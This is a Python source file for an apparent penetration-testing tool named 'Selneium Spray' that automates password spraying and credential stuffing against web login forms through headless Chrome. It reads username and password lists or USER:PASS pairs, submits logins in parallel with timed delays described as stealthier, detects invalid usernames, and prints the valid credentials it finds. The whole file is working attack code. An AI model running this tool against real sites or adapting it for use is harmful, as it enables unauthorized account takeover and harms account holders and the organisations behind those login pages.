import argparse
import sys
from time import sleep
from selenium import webdriver
from selenium.webdriver import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.ui import WebDriverWait
from datetime import datetime, timedelta
from selenium.common.exceptions import TimeoutException
from concurrent.futures import ProcessPoolExecutor
import multiprocessing
import pause

# --------------------------------- #
# GLOBAL VARIABLES                  #
# --------------------------------- #

valid_credentials = []
__version__ = "0.3"


# --------------------------------- #
# CLASSES                           #
# --------------------------------- #

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# --------------------------------- #
# FUNCTIONS                         #
# --------------------------------- #

def main(usernames="", passwords="", domain="", domain_after=False, url="", username_field="", password_field="",
         checkbox="", fail="", success="", threads=5, delay=30, invalid_username=""):
    # Prepare variables
    fail, success = prepare_success_fail(fail=fail, success=success)
    usernames = process_file(usernames)
    if passwords:
        passwords = process_file(passwords)
    else:
        passwords = []
    usernames = prepare_usernames(usernames, domain, domain_after)
    url = prepare_url(url)
    invalid_username = prepare_invalid_username(invalid_username=invalid_username)
    (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
     checkbox_value) = prepare_fields(username_field, password_field, checkbox=checkbox)
    print_beginning(usernames=usernames, passwords=passwords, domain=domain, domain_after=domain_after, url=url,
                    fail=fail, success=success, threads=threads, delay=delay, username_field=username_field,
                    password_field=password_field, invalid_username=invalid_username)

    if not passwords and ":" in usernames[1]:
        credential_stuffing(usernames, url, fail, success, threads, delay, invalid_username, username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
     checkbox_value)
    # Loop through passwords
    password_id = 0
    while password_id < len(passwords):
        next_start_time = datetime.now() + timedelta(minutes=delay)  # Check when the next spray should run

        print(f"Beginning spray with password '{passwords[password_id]}'")

        # Spin up processes for each login attempt. Threads could have also been utilized, but Selenium is cleaner with
        # individual processes.
        manager = multiprocessing.Manager()
        queue = manager.Queue()
        with ProcessPoolExecutor(max_workers=threads) as executor:
            for username in usernames:
                processes = executor.submit(attempt_login,
                                            queue=queue,
                                            username=username,
                                            password=passwords[password_id],
                                            url=url,
                                            username_field_key=username_field_key,
                                            username_field_value=username_field_value,
                                            password_field_key=password_field_key,
                                            password_field_value=password_field_value,
                                            checkbox_key=checkbox_key,
                                            checkbox_value=checkbox_value,
                                            fail=fail,
                                            success=success,
                                            invalid_username=invalid_username)
            processes.result()

        usernames = process_queue(queue=queue, usernames=usernames)  # Retrieve results from the queue

        # Check to see if the process is at the end. If not, wait the specified time.
        password_id += 1
        if password_id < len(passwords):
            print(f"Spray of password '{passwords[(password_id - 1)]}' complete. Waiting until "
                  f"{next_start_time.strftime('%H:%M')} to start next spray.")
            pause.until(next_start_time)
        else:
            print(f"Spray of password '{passwords[password_id - 1]}' complete. All passwords complete.")

    print_ending()


def credential_stuffing(usernames, url, fail, success, threads, delay, invalid_username, username_field_key,
                        username_field_value, password_field_key, password_field_value, checkbox_key, checkbox_value):
    credentials = []
    for credential in usernames:
        username = credential.split(":")[0]
        password = credential.split(":")[1]
        credentials.append({'USERNAME': username, 'PASSWORD': password, 'ATTEMPT': 0})

    # Assign unique spray identifier
    from collections import defaultdict
    user_groups = defaultdict(list)
    for d in credentials:
        user_groups[d['USERNAME']].append(d)
    for user, group in user_groups.items():  # Assigning sequential ATTEMPT values
        for index, d in enumerate(group, start=1):
            d['ATTEMPT'] = index
    credentials = [d for group in user_groups.values() for d in group]  # Flatten the list

    stuffing_attempt = 1
    num_stuffing_attempts = max(d['ATTEMPT'] for d in credentials)
    while stuffing_attempt <= num_stuffing_attempts:
        next_start_time = datetime.now() + timedelta(minutes=delay)  # Check when the next spray should run
        print(f"Beginning stuffing attempt {stuffing_attempt} of {num_stuffing_attempts}.")

        # Spin up processes for each login attempt. Threads could have also been utilized, but Selenium is cleaner with
        # individual processes.
        manager = multiprocessing.Manager()
        queue = manager.Queue()
        with ProcessPoolExecutor(max_workers=threads) as executor:
            for credential in credentials:
                if credential['ATTEMPT'] == stuffing_attempt:
                    processes = executor.submit(attempt_login,
                                                queue=queue,
                                                username=credential['USERNAME'],
                                                password=credential['PASSWORD'],
                                                url=url,
                                                username_field_key=username_field_key,
                                                username_field_value=username_field_value,
                                                password_field_key=password_field_key,
                                                password_field_value=password_field_value,
                                                checkbox_key=checkbox_key,
                                                checkbox_value=checkbox_value,
                                                fail=fail,
                                                success=success,
                                                invalid_username=invalid_username)
            processes.result()

        # The credential stuffing attempts do not remove valid credentials from future sprays
        credentials = process_queue(queue=queue, usernames=credentials)  # Retrieve results from the queue

        # Check to see if the process is at the end. If not, wait the specified time.
        if stuffing_attempt < (num_stuffing_attempts):
            print(f"Stuffing attempt {stuffing_attempt} of {num_stuffing_attempts} complete. Waiting until "
                  f"{next_start_time.strftime('%H:%M')} to start next spray.")
            pause.until(next_start_time)
        else:
            print(f"Spray of password {stuffing_attempt} of {num_stuffing_attempts} complete. All passwords complete.")
        stuffing_attempt += 1


def process_queue(queue=None, usernames=None):
    if queue.empty():
        return usernames
    while not queue.empty():
        user = queue.get()
        for i in range(len(usernames) - 1, -1, -1):  # Loop in reverse to avoid index issues
            if usernames[i]["USERNAME"] == user["USERNAME"]:
                del usernames[i]
        if user["VALID"]:
            global valid_credentials
            valid_credentials.append({"USERNAME": user["USERNAME"], "PASSWORD": user["PASSWORD"]})

    return usernames


def print_beginning(usernames=None, passwords=None, domain="", domain_after=False, url="", invalid_username=None,
                    fail="", success="", threads=5, delay=30, username_field="", password_field=""):
    # Calculate length of spray
    total_minutes = len(passwords) * delay
    days = total_minutes // (24 * 60)
    hours = (total_minutes % (24 * 60)) // 60
    minutes = total_minutes % 60
    if days == 0:
        spray_duration = "{:02d}:{:02d}".format(hours, minutes)
    else:
        spray_duration = "{:02d} {:02d}:{:02d}".format(days, hours, minutes)

    print(f"{Colors.HEADER}{Colors.BOLD}Selneium Spray{Colors.END}")
    print(f"Author:  Luke Lauterbach (Sentinel Technologies)")
    print(f"Version: {__version__}\n")

    print(f"{'Username Count:':<28}{len(usernames)}")
    print(f"{'Password Count:':<28}{len(passwords)}")
    print(f"{'Total Login Attempts:':<28}{(len(usernames) * len(passwords))}")
    print(f"{'Approximate Spray Duration:':<28}{spray_duration}")
    print(f"{'URL:':<28}{url}")
    if domain and domain_after:
        print(f"{'Domain:':<28}@{domain}")
    elif domain and not domain_after:
        print(f"{'Domain:':<28}{domain}/")
    print(f"{'Username Field:':<28}{username_field}")
    print(f"{'Password Field:':<28}{password_field}")
    if success:
        print(f"{'Success Condition:':<28}{success}")
    elif fail:
        print(f"{'Failure Condition:':<28}{fail}")
    print(f"{'Invalid Username Condition:':<28}{invalid_username}")
    print(f"{'Threads:':<28}{threads}")
    print(f"{'Delay:':<28}{delay}\n")


def print_ending():
    global valid_credentials
    print(f"\nPassword spraying completed at {datetime.now().strftime('%m/%d/%Y %H:%M')}")
    print(f"Valid Credentials Found: {len(valid_credentials)}")
    if valid_credentials:
        print(f"\nValid Credentials:")
        print(f"------------------")
        for credential in valid_credentials:
            print(f"{credential['USERNAME']} - {credential['PASSWORD']}")


def parse_arguments():
    parser = argparse.ArgumentParser(description="Performs a password spraying attack utilizing Selenium.")
    required = parser.add_argument_group("Required")
    condition = parser.add_argument_group("Condition for Successful Login (One Required)")
    optional = parser.add_argument_group("Optional")

    required.add_argument('URL',
                          help="(REQUIRED) URL of the website to spray.")
    optional.add_argument("-d", "--domain",
                          help="(REQUIRED) Prefix all usernames with a domain (e.g. DOMAIN\\USERNAME)")
    optional.add_argument("-da", "--domain-after", action="store_true",
                          help="(OPTIONAL) Append domain to the end of the username (e.g. username@domain)")
    required.add_argument("-p", "--password",
                          help="(OPTIONAL) Password or file with list of usernames to spray.")
    condition.add_argument('-f', '--fail',
                           help="(OPTIONAL) Text which will be on the page if authentication fails. -s can be used as "
                                "an alternative.")
    condition.add_argument('-s', '--success',
                           help="(OPTIONAL) Text which will be on the page if authentication is successful. -f can be "
                                "used as an alternative")
    required.add_argument("-u", "--username", required=True,
                          help="(REQUIRED) Username or file with list of usernames to spray. Alternatively, can be a"
                               "list of colon-seperated credentials to spray (e.g. USER:PASS)")
    optional.add_argument("-i", "--invalid-username", type=str,
                          help="(OPTIONAL) String(s) to look for to determine if the username was invalid. Multiple "
                               "strings can be provided comma seperated with no spaces.")
    required.add_argument('-uf', '--username-field', required=True, type=str,
                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
                               "a username into. Can be found by inspecting the username field in your browser. For"
                               "example, if '<input type='email'>', enter 'type='email''")
    required.add_argument('-pf', '--password-field', required=True, type=str,
                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
                               "a username into. Can be found by inspecting the username field in your browser. For"
                               "example, if '<input type='email'>', enter 'type='email''")
    optional.add_argument('-cb', '--checkbox', type=str,
                          help="(OPTIONAL) If a checkbox is required, provide a unique attribute of the checkbox, "
                               "allowing the script to automatically check it. For example, if "
                               "'<input type='checkbox'>', enter 'type='checkbox''")

    optional.add_argument('-t', '--threads', type=int, default=5,
                          help="(OPTIONAL) Number of threads for passwords spraying. Lower is stealthier. "
                               "Default is 5.")
    optional.add_argument('-dl', '--delay', type=int, default=30,
                          help="(OPTIONAL) Length of time between passwords. The delay is between the first spray "
                               "attempt with a password and the first attempt with the next password. Default is 30.")

    args = parser.parse_args()  # Parse the command-line arguments
    return (args.username, args.password, args.domain, args.domain_after, args.URL, args.username_field,
            args.password_field, args.checkbox, args.fail, args.success, args.threads, args.delay,
            args.invalid_username)


def import_txt_file(filename):
    data = []
    with open(filename, "r") as file:
        for line in file:
            data.append(line.rstrip())
    return data


def process_file(filename):
    if filename.endswith(".txt"):
        return import_txt_file(filename)
    elif filename.endswith(".csv"):
        print("ERROR - CSVs are currently not supported.")
        sys.exit()
    else:
        return [filename]  # If it isn't a file, just return the username.


def prepare_success_fail(success="", fail=""):
    if not success and not fail:
        print(f"{Colors.FAIL}ERROR - No success or failure condition provided with -s or -f. Only one needs to be "
              f"provided, but one does need to be provided.{Colors.END}")
        sys.exit()
    elif success:
        success = success.split(",")
        fail = []
    elif fail:
        fail = fail.split(",")
        success = []

    return fail, success


def prepare_usernames(usernames=None, domain="", domain_after=False):
    if not domain:
        return usernames

    i = 0
    while i < len(usernames):
        if "/" in usernames[i] or "@" in usernames[i]:  # If the domain is already in the username, ignore the domain
            i += 1
            continue

        if domain_after:
            usernames[i] = f"{usernames[i]}@{domain}"
        else:
            usernames[i] = f"{domain}/{usernames[i]}"

        i += 1

    return usernames


def prepare_url(url=""):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"https://{url}"  # TODO Check URL and allow http://, if that's all that's supported.

    return url


def prepare_fields(username_field="", password_field="", checkbox=""):
    username_field = username_field.replace("'", "").replace('"', "")  # Remove quotation marks
    password_field = password_field.replace("'", "").replace('"', "")  # Remove quotation marks

    username_field = username_field.split("=")
    username_field_key = username_field[0]
    username_field_value = username_field[1]

    password_field = password_field.split("=")
    password_field_key = password_field[0]
    password_field_value = password_field[1]

    if checkbox:
        checkbox = checkbox.replace("'", "").replace('"', "")  # Remove quotation marks
        checkbox = checkbox.split("=")
        checkbox_key = checkbox[0]
        checkbox_value = checkbox[1]
    else:
        checkbox_key, checkbox_value = "", ""

    return (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
            checkbox_value)


def prepare_invalid_username(invalid_username=None):
    final_list = ["couldn't find an account with that username", "this username may be incorrect"]
    if invalid_username:
        invalid_username = invalid_username.split(",")
        final_list.extend(invalid_username)
    return final_list


def list_in_string(string_to_check="", list_to_compare=None):
    if not list_to_compare:
        return False
    for comparison_string in list_to_compare:
        if comparison_string in string_to_check:
            return True
    return False


def attempt_login(username=None, password="", url="", username_field_key="", username_field_value="",
                  password_field_key="", password_field_value="", checkbox_key="", checkbox_value="", fail=None,
                  success=None, queue=None, invalid_username=None):
    selenium_options = webdriver.ChromeOptions()
    selenium_options.add_argument('--ignore-certificate-errors')
    selenium_options.add_argument("--headless")
    driver = webdriver.Chrome(options=selenium_options)
    driver.delete_all_cookies()
    driver.get(url)

    # Wait until the username box loads
    try:
        WebDriverWait(driver, 5).until(
            ec.element_to_be_clickable((By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")))
    except:
        print(f"ERROR - Could not find the username field with key {username_field_key} and value "
              f"{username_field_value}")
        driver.close()
        return

    # Find the username box
    input_box = driver.find_element(By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")
    input_box.clear()  # Clear any existing text in the input box
    input_box.send_keys(username)

    # Try to find the password box. If it isn't on the current page, hit the ENTER key and wait for the Password
    # field to load.
    try:
        WebDriverWait(driver, 1).until(
            ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
    except TimeoutException:
        input_box.send_keys(Keys.RETURN)
        sleep(1)  # Wait for the page to load
        if "Microsoft" and "Work or school account" in driver.page_source:
            work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
            work_box.click()
            sleep(1)

    if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=invalid_username):
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {username}")
        queue.put({"USERNAME": username, "PASSWORD": password, "VALID": False})
        driver.close()
        return

    try:
        WebDriverWait(driver, 3).until(
            ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
    except:
        print(f"ERROR - Could not find the password field with key '{password_field_key}' and value "
              f"'{password_field_value}'")
        driver.close()
        return

    password_box = driver.find_element(By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")
    password_box.clear()
    password_box.send_keys(password)
    # If there's a checkbox, click it.
    if checkbox_key and checkbox_value:
        try:
            checkbox = driver.find_element(By.XPATH, f"//input[@{checkbox_key}='{checkbox_value}']")
            checkbox.click()
        except:
            print(f"ERROR - Could not find the password field with key {password_field_key} and value "
                  f"{password_field_value}")

    password_box.send_keys(Keys.RETURN)

    # Check to see if the login was successful
    sleep(2)
    result = False
    for conditional_statement in (fail + success):
        if conditional_statement in driver.page_source:
            result = True

    if result and success:
        result = "SUCCESS"
    elif not result and fail:
        result = "SUCCESS"
    elif result and fail:
        result = "INVALID"
    elif not result and success:
        result = "INVALID"

    if result == "SUCCESS":
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {username} - "
              f"{password}")
        queue.put({"USERNAME": username, "PASSWORD": password, "VALID": True})
    else:
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {username} - {password}")

    driver.quit()


# --------------------------------- #
# MAIN                              #
# --------------------------------- #

if __name__ == "__main__":
    (main_usernames, main_passwords, main_domain, main_domain_after, main_url, main_username_field, main_password_field,
     main_checkbox, main_fail, main_success, main_threads, main_delay, main_invalid_username) = parse_arguments()
    try:
        main(usernames=main_usernames, passwords=main_passwords, domain=main_domain, domain_after=main_domain_after,
             url=main_url, username_field=main_username_field, password_field=main_password_field,
             checkbox=main_checkbox, fail=main_fail, success=main_success, threads=main_threads, delay=main_delay,
             invalid_username=main_invalid_username)
    except KeyboardInterrupt:
        print("\nCtrl+C Detected")
        print_ending()
        exit()
